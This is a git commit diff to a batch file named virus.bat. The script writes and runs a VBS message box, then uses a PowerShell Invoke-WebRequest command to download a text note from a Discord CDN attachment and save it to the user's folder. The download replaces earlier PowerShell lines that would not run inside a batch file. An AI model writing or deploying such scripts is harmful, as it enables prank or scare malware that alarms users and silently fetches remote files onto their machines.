5ea25e245819bb59ddc09331d6e20b25d9709220
NANO <66187077+NANO-ck@users.noreply.github.com>
2021-04-07 19:23:02 +0200

    Update virus.bat

--- src/virus.bat
+++ src/virus.bat
@@ -8,8 +8,5 @@ SET tmpmsgbox=%temp%\~tmpmsgbox.vbs
 IF EXIST "%tmpmsgbox%" DEL /F /Q "%tmpmsgbox%"
 ECHO msgbox "%msgboxBody%",0,"%msgboxTitle%">"%tmpmsgbox%"
 WSCRIPT "%tmpmsgbox%"
-webclient = New-Object System.Net.WebClient
-url = "https://cdn.discordapp.com/attachments/800052087136190467/829393545436725258/READ-ME.txt"
-file = "C:\Desktop\READ-ME.txt"
-webclient.DownloadFile(url,file)
+powershell.exe -Command "Invoke-WebRequest -OutFile ./READ-ME-IMPORTANT.txt https://cdn.discordapp.com/attachments/800052087136190467/829393545436725258/READ-ME.txt"
 pause
